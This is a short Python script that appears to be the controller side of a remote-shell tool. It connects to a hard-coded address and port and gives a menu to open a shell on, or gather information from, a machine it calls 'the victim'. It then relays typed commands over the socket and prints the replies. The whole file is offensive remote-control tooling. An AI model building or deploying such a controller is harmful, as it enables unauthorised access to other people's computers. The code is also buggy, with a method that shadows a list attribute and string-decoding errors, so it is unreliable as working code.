import socket
import os


class Shell:

    history = [""]
    command = ""
    next_command = True

    def send(self):
        # self.history.append(self.command)
        s.send(self.command.encode("utf-8"))

    def receive(self):
        content = s.recv(4096).decode("utf-8")
        if content[2:] == "cd":
            os.chdir(self.command[3:].decode("utf-8"))
        print(content)

    def history(self):
        print("The history of your commands is:\n")
        for element in self.history:
            print(self.history(element))

    # def chgdir(self):
    #     os.chdir(self.command[3:].decode("utf-8"))

    def close(self):
        self.next_command = False


serv_addr = ("192.168.1.25", 12345)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(serv_addr)
print(s.recv(4096))
message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
s.send(message.encode("utf-8"))
while message != "exit":
    if message == "1":
        shell = Shell()
        while shell.next_command:
                shell.command = input("Shell: ")
                while shell.command == "":
                    shell.command = input("Shell: ")
                if shell.command == "exit":
                    shell.close()
                # elif shell.command[:2] == "cd":
                #     shell.chgdir()
                else:
                    shell.send()
                    shell.receive()
    elif message == "2":
        pass


    message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
    s.send(message.encode("utf-8"))


s.close()